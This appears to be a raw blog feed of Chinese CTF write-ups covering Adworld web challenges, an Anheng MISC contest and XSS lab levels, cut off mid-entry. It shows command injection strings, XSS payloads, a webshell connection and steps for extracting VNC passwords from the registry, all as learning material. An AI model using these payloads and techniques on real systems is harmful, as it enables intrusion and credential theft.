src="http://img-blog.csdnimg.cn/20190717194503230.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到题目先了解下xff和referer</p><h5 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h5><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p><p>简单地说，<strong>xff是告诉服务器当前请求者的最终ip的http请求头字段</strong><br>通常可以直接通过<strong>修改http头中的X-Forwarded-For字段来仿造请求的最终ip</strong></p><h5 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h5><p>HTTP来源地址（referer，或HTTPreferer）<br>是HTTP表头的一个字段，用来表示从哪儿链接到当前的网页，采用的格式是URL。换句话说，借着HTTP来源地址，当前的网页可以检查访客从哪里而来，这也常被用来对付伪造的跨网站请求。</p><p><strong>简单的讲，referer就是告诉服务器当前访问者是从哪个url地址跳转到自己的，跟xff一样，referer也可直接修改</strong><br><img src="http://img-blog.csdnimg.cn/20190717194808357.jpg" alt="在这里插入图片描述"><br>题目说IP地址必须为123.123.123.123<br>所以抓包修改XFF<br><img src="http://img-blog.csdnimg.cn/20190717194649746.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而又显示请求来自<a href="http://www.google.com/，所以修改Referer" target="_blank" rel="noopener">http://www.google.com/，所以修改Referer</a><br><img src="http://img-blog.csdnimg.cn/20190717194955250.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后点击Go，得到flag</p><h4 id="Web9：weak-auth-弱身份验证"><a href="#Web9：weak-auth-弱身份验证" class="headerlink" title="Web9：weak_auth(弱身份验证)"></a>Web9：weak_auth(弱身份验证)</h4><p><img src="http://img-blog.csdnimg.cn/20190717195442207.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190717195941575.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随手设的密码，应该就是弱口令。而用户名是admin<br><img src="http://img-blog.csdnimg.cn/20190717200501970.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以直接用Burpsuite进行字典(弱口令字典)爆破<br><img src="http://img-blog.csdnimg.cn/20190717195502572.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将password的值设为变量<br><img src="http://img-blog.csdnimg.cn/20190717201029509.png" alt="在这里插入图片描述"><br>选择字典文件<br><img src="http://img-blog.csdnimg.cn/20190717200803608.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190717201049949.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现到123456时，长度不同，所以密码为123456，登陆一下即可得出flag<br><img src="http://img-blog.csdnimg.cn/2019071720113499.jpg" alt="在这里插入图片描述"></p><h4 id="Web10：webshell"><a href="#Web10：webshell" class="headerlink" title="Web10：webshell"></a>Web10：webshell</h4><p><img src="http://img-blog.csdnimg.cn/20190717201333775.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看题目，应该是一句话木马<br><img src="http://img-blog.csdnimg.cn/20190717201525686.png" alt="在这里插入图片描述"><br>果然是一句话木马，直接菜刀连<br><img src="http://img-blog.csdnimg.cn/20190717201659459.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连接成功，得到flag<br><img src="http://img-blog.csdnimg.cn/20190717201717806.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web11：command-execution-命令执行"><a href="#Web11：command-execution-命令执行" class="headerlink" title="Web11：command_execution(命令执行)"></a>Web11：command_execution(命令执行)</h4><p><img src="http://img-blog.csdnimg.cn/20190717201851329.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看题目，先了解下<strong>ping、waf、命令执行、Linux命令</strong></p><h5 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h5><p><a href="https://blog.csdn.net/qq646748739/article/details/81660514" target="_blank" rel="noopener">ping命令用法</a></p><h5 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h5><p><a href="https://baike.baidu.com/item/WAF/3239498?fr=aladdin" target="_blank" rel="noopener">WAF</a><br>WAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。</p><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p><a href="https://www.freebuf.com/column/154670.html" target="_blank" rel="noopener">命令执行</a><br>常见命令执行</p><pre><code class="php">command1 &amp; command2 ：先执行command2后执行command1command1 &amp;&amp; command2 ：先执行command1后执行command2command1 | command2 ：只执行command2command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</code></pre><h5 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h5><p><a href="https://www.cnblogs.com/cokefentas/p/11101000.html" target="_blank" rel="noopener">常用的Linux命令</a><br>开始做题<br><img src="http://img-blog.csdnimg.cn/20190717205444453.jpg" alt="在这里插入图片描述"><br>首先先尝试ping一下127.0.0.1<br><strong>方法一：</strong><br><img src="http://img-blog.csdnimg.cn/20190717205414277.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><a href="https://blog.csdn.net/dyw_666666/article/details/79184126" target="_blank" rel="noopener">ls命令查看目录文件</a><br><img src="http://img-blog.csdnimg.cn/20190717205507687.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190717205643867.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190717205700690.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2019071720571591.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用cat命令查看txt文件<br><img src="http://img-blog.csdnimg.cn/20190717205737180.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>方法二：</strong><br>首先先尝试ping一下127.0.0.1，并回显执行的命令<br><img src="http://img-blog.csdnimg.cn/20190717210531166.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ping通本地后，发现传输三个数据包。查看三个数据包中是否有flag.txt<br>输入命令</p><pre><code class="php">127.0.0.1 &amp; find / -name flag.txt</code></pre><p><img src="http://img-blog.csdnimg.cn/20190717210941402.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现有flag.txt，再输入命令</p><pre><code class="php">127.0.0.1 | cat /home/flag.txt</code></pre><p>查看flag.txt文件，得出flag<br><img src="http://img-blog.csdnimg.cn/20190717211123865.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web12：simple-php"><a href="#Web12：simple-php" class="headerlink" title="Web12：simple_php"></a>Web12：simple_php</h4><p><img src="http://img-blog.csdnimg.cn/20190717211602245.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190717211652841.jpg" alt="在这里插入图片描述"><br>看题目，这应该是代码审计</p><pre><code class="php">is_numeric() 函数用于检测变量是否为数字或数字字符串。</code></pre><p>传入对应的参数即可得出flag<br><img src="http://img-blog.csdnimg.cn/20190717211845228.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>做完攻防世界新手区的Web题，对Web题的类型有了大致了解。题不是太难，但可以学习到很多Web题的基础知识。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒月赛7月-MISC wp</title>
      <link href="/2019/07/15/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B7%E6%9C%88-MISC%20wp/"/>
      <url>/2019/07/15/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B7%E6%9C%88-MISC%20wp/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天安恒月赛，和最近一部热剧有一点点关系。而我就做出了两道MISC题，还是写一下Write Up。。。。</p><h3 id="MISC1：真正的CTFer在哪？！"><a href="#MISC1：真正的CTFer在哪？！" class="headerlink" title="MISC1：真正的CTFer在哪？！"></a>MISC1：真正的CTFer在哪？！</h3><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMTFiNDg3MmFmZGU4MzIyMS5qcGc" alt></p><p>下载解压题目文件，发现一张图片</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZGIzN2E2MGU0Mjc4MGMwMy5qcGc" alt></p><p>用binwalk分析一下，并没有隐藏文件</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOTA0YTg5MmNhZTgwOTU1Yy5qcGc" alt></p><p>查看图片详细信息，没有隐藏东西。然后看了下图片宽高(分辨率)，并用winHex打开发现，高度不一致</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNDM3ZmExOTVhNzQ5ZjMwMC5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYTVmOTc5MWNkNWNiYzA0Mi5qcGc" alt></p><p>将分辨率转换成16进制，0500应该改为0A00。高度恢复了</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYTI4MzUxODVlNjhkMmY5OC5wbmc" alt></p><p>发现flag了</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNTkzMzQ0M2IyYTQ3NjllYi5qcGc" alt></p><p>发现看不清，也可以看出。想用stegsove反色看一下，然而用stegsolve打不开修改高度后的图片。</p><p>于是百度了下原因</p><p><strong>对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。</strong></p><p><strong>而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOWUxZDkyOWRmMzYyNjA5OC5qcGc" alt></p><p>箭头所指即为crc效验码。</p><p>可以通过爆破图片修改前的宽和高来匹配CRC校验码，并用正确的宽和高来修复图片</p><p>为了做题的方便，先尝试爆破高度，脚本如下(百度搜的，还不会写，只修改了参数)：</p><pre><code class="python"># -*- coding: utf-8 -*-import binasciiimport struct#\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xA4\x08\x06\x00\x00\x00crc32key = 0x6F03AD71for i in range(0, 65535):  height = struct.pack(&#39;&gt;i&#39;, i)  #CRC: 6F03AD71  data = &#39;\x49\x48\x44\x52\x00\x00\x05\x1C&#39; + height + &#39;\x08\x06\x00\x00\x00&#39;  crc32result = binascii.crc32(data) &amp; 0xffffffff  if crc32result == crc32key:    print &#39;&#39;.join(map(lambda c: &quot;%02X&quot; % ord(c), height))</code></pre><p>运行脚本，输出<strong>000009E4</strong>，即原图片高度为00 00 09 E4爆破成功</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNzU0ZjRjYjEzY2NjM2U0ZC5qcGc" alt></p><p>修改后，发现可以用stegsolve打开了</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYWQzZDg3ZDY2MDJjN2U5NS5qcGc" alt></p><h3 id="MISC2：解不开的秘密"><a href="#MISC2：解不开的秘密" class="headerlink" title="MISC2：解不开的秘密"></a>MISC2：解不开的秘密</h3><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvY2M2YWMzZWI3MTQ3YmYxNy5qcGc" alt></p><p>下载题目文件并解压。发现一个word文档和file文件。word文档是加密的，file是一串16进制。Hex转ASCII</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNjBhMTM1OGJlNTBmNDc4My5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYzRkNjYzYTUxNjEyZDIxMC5qcGc" alt></p><p>很明显应该是Base64，解密</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMWU0ZDAyZjZjZjZmNTlmNy5qcGc" alt></p><p>发现很多信息，第一印象先考虑password的值，发现并不对。于是仔细分析下解密的内容</p><pre><code class="html">Windows Registry Editor Version 5.00[HKEY_CURRENT_USER\Software\RealVNC][HKEY_CURRENT_USER\Software\RealVNC\vnclicensewiz]&quot;_AnlClientId&quot;=&quot;8f5cc378-2e1d-4670-80e0-d2d81d882561&quot;&quot;_AnlSelected&quot;=&quot;0&quot;&quot;_AnlInclRate&quot;=&quot;0.0025&quot;[HKEY_CURRENT_USER\Software\RealVNC\vncserver][HKEY_CURRENT_USER\Software\RealVNC\VNCViewer4]&quot;dummy&quot;=&quot;&quot;[HKEY_CURRENT_USER\Software\RealVNC\VNCViewer4\MRU]&quot;00&quot;=&quot;127.0.0.1&quot;&quot;Order&quot;=hex:00,01&quot;01&quot;=&quot;127.0.0.1:5900&quot;[HKEY_CURRENT_USER\Software\RealVNC\WinVNC4]&quot;Password&quot;=hex:37,5e,be,86,70,b3,c6,f3&quot;SecurityTypes&quot;=&quot;VncAuth&quot;&quot;ReverseSecurityTypes&quot;=&quot;None&quot;&quot;QueryConnect&quot;=dword:00000000&quot;PortNumber&quot;=dword:0000170c&quot;LocalHost&quot;=dword:00000000&quot;IdleTimeout&quot;=dword:00000e10&quot;HTTPPortNumber&quot;=dword:000016a8&quot;Hosts&quot;=&quot;+,&quot;&quot;AcceptKeyEvents&quot;=dword:00000001&quot;AcceptPointerEvents&quot;=dword:00000001&quot;AcceptCutText&quot;=dword:00000001&quot;SendCutText&quot;=dword:00000001&quot;DisableLocalInputs&quot;=dword:00000000&quot;DisconnectClients&quot;=dword:00000001&quot;AlwaysShared&quot;=dword:00000000&quot;NeverShared&quot;=dword:00000000&quot;DisconnectAction&quot;=&quot;None&quot;&quot;RemoveWallpaper&quot;=dword:00000000&quot;RemovePattern&quot;=dword:00000000&quot;DisableEffects&quot;=dword:00000000&quot;UseHooks&quot;=dword:00000001&quot;PollConsoleWindows&quot;=dword:00000001&quot;CompareFB&quot;=dword:00000001&quot;Protocol3.3&quot;=dword:00000000&quot;dummy&quot;=&quot;&quot;</code></pre><p>百度搜索一下关键字<code>RealVNC</code>，发现这是VNC加密。了解一下相关知识</p><p>1、因为VNC的密码是保存在注册表中的，需要能读出来，这一点比PCANYWHERE的利用难度大一点</p><p>VNC3.0版本的的密码存放在HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password 处</p><p>VNC4.0版本的密码存放在HKEY_CURRENT_USER\Software\RealVNC\WinVNC4\Password 处</p><p>2、假如我们已经获得了web服务器的webshell权限，同时对注册表有读取权限（这里如何获得web服务器的webshell权限，暂不介绍），我们使用命令webshell命令regedit -e c:\vnc.reg  HKEY_CURRENT_USER\Software\RealVNC\WinVNC4\ 把注册表信息导出到c盘下的vnc.reg文件，然后右键编辑</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNmVkOTRjZjliZjQ5OGVkNy5qcGc" alt></p><p>如上图，我们看到了加密后保存在注册表里的vnc密码，可以使用破解软件vncx4.exe来破解该密码</p><pre><code>命令：vncx4 -W</code></pre><p>然后顺序输入上面的每一个十六进制数据，每输完一个回车一次就行了</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYTU1YjQ1ZGM0OGZhMDQzMS5qcGc" alt></p><p>得到的密码，应该就是word文档的密码了。输入密码打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvN2I4ZDZkMmZhMDg1OTIzNS5qcGc" alt></p><p>根据提示，flag应该就在这里了。</p><p>首先，保存word里的图片，考虑图片隐写。然而并不是图片隐写，那flag应该还在word里。移走图片，发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMGJlMDNkYjE1YTQzNDAxNC5qcGc" alt></p><p>这个地方可能有东西，文件-&gt;选项-&gt;显示。显示(打印)隐藏文字。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNjYwZTc0MDA0MjljZTFkOC5qcGc" alt></p><p>然而并没有什么用。于是直接复制那串空白，粘贴到一个地方，得到flag了。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMzYyNjRjMTczMTQ3NjNmYi5qcGc" alt></p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>做了安恒月赛的题，发现自己依旧还很菜。不过在做题的过程中又学到了新知识。</p><p>小白进阶ing。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> 安恒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞攻关(二)</title>
      <link href="/2019/07/14/XSS%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%85%B3(%E4%BA%8C)/"/>
      <url>/2019/07/14/XSS%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%85%B3(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前已经总结过一部分xss的一些绕过方式，但由于其他原因没有总结完，现在有时间了，于是参考了大牛的博客，继续总结了一下。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="XSS攻击常见利用方式-后续"><a href="#XSS攻击常见利用方式-后续" class="headerlink" title="XSS攻击常见利用方式(后续)"></a>XSS攻击常见利用方式(后续)</h4><h5 id="7-HTTP头流量包注入"><a href="#7-HTTP头流量包注入" class="headerlink" title="7.HTTP头流量包注入"></a>7.HTTP头流量包注入</h5><p>这一部分需要抓包改包，还好之前学习了点HTTP协议基础。</p><p>就再次了解下BurpSuite怎么抓包改包就行了。</p><p>参考博客：<a href="https://www.jianshu.com/p/7e94a79abe95" target="_blank" rel="noopener">Burpsuite拦截并修改request/response</a></p><p><strong>Level11 12 13</strong></p><p>这三道题都是一样的利用方式，从Level10过来之后，会发现Level11的<code>&lt;input&gt;</code>标签里面t_ref默认值是该网页是从Level10页面链接过来的。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNjljMzFhNjUzZTM2MGQyOC5qcGc" alt></p><p>所以对其进行抓包，修改Referer参数。</p><p>因为Level11是referer，所以得用burpsuite来抓包改，直接用hackbar是改不了的。</p><p>参考payload:</p><pre><code class="html">&quot; type=&quot;text&quot; onclick=&quot;alert()</code></pre><pre><code class="html">” onmouseover=&#39;alert(1)&#39; type=&quot;text&quot;</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZGIzOTI5YjhmNjhhNTQ2OS5qcGc" alt></p><p>修改成payload之后，点击Forword转发报文(发包)即可</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNDVhY2Q1YWJjNTdjNzVmNy5qcGc" alt></p><p>看到多出来一个框，因为我使用的是<code>onclick</code>事件，所以要鼠标点击一下才会触发。</p><p>Level12、Level13的payload是一样的，只是输入点不一样而已，Level12注入点是<strong>User-Agent</strong>，Level12注入点是<strong>cookie</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOGNmZDBjMGEzZjk1MjE4OS5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNWE4NzFlMTlkNjhmOGM4My5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMGVjOTIxMjIyMDU0MTQ2Ny5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMDY3YzFkODdkNTExZTExZC5qcGc" alt></p><h5 id="8-其他"><a href="#8-其他" class="headerlink" title="8.其他"></a>8.其他</h5><p>后边的关卡好像比较难，就不分利用类型了。</p><p> <strong>Level 14</strong></p><p>看了大牛的博客才知道这道题崩了。。。听说图片exif 藏有xss payload</p><p> <strong>Level 15</strong></p><p>看了大牛的博客，知道这一关考的是angular js的知识。好像不会。。。稍微百度一下相关知识</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYWQ3NTEyN2QwYWM1YmVmMS5qcGc" alt></p><p>发现ng-include有包含文件的意思，也就相当于php里面的include。</p><p>发现可以包含第一关的页面，</p><p>参考payload:</p><pre><code class="html">&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMmFlMjA3YzM5MTlkMzFjOS5qcGc" alt></p><p>至于为什么这么构造payload。现在还不太懂。。。</p><p> <strong>Level 16</strong></p><p>与Level 15相比，过滤了空格。可以选择用其他符号来绕过。如：<code>%0a%0d</code></p><p>参考payload:</p><pre><code class="html">&lt;img%0a%0dsrc=x%0a%0donerror=alert(1)&gt;</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZmNkNjViODJmMjY0ZWFjMC5qcGc" alt></p><p><strong>Level 17 18</strong></p><p>这两关的考点是一样的，同样的payload可以绕过。</p><p>参考payload:</p><pre><code class="html">onmouseover=alert(1) 注意：onmouseover前面有一个空格</code></pre><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZGRkN2RiOWM0MmNkMDJmOS5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMGIyYWU0Y2VjZGZlMDJmYS5qcGc" alt></p><p><strong>Level 19 20</strong></p><p>都过滤了双引号，闭合不了。看大牛的博客，发现应该是考flash的。我不会，略过。。。去看一下21题，好像崩了。。。。就先这样吧。。。</p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>这次闯关，又学习到不少知识。尤其是学到了burpsuite的抓包改包相关的知识。</p><p>这次做题有点着急。由于不会，看了一些参考博客，这样不利于自己解题。希望自己再接再励。。</p><p>小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-位移编码</title>
      <link href="/2019/07/12/Crypto-%E4%BD%8D%E7%A7%BB%E7%BC%96%E7%A0%81/"/>
      <url>/2019/07/12/Crypto-%E4%BD%8D%E7%A7%BB%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习了解了一下简单的<strong>移位编码</strong>，于是做题总结了一下</p><h3 id="Crypto1：困在栅栏里的凯撒"><a href="#Crypto1：困在栅栏里的凯撒" class="headerlink" title="Crypto1：困在栅栏里的凯撒"></a>Crypto1：困在栅栏里的凯撒</h3><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZjAxN2MzNmE2ZmU4NGUzNS5qcGc" alt></p><p>看到题目，应该和凯撒密码和栅栏密码有关。所以做题之前先了解一下<strong>栅栏密码和凯撒密码</strong></p><h4 id="栅栏密码"><a href="#栅栏密码" class="headerlink" 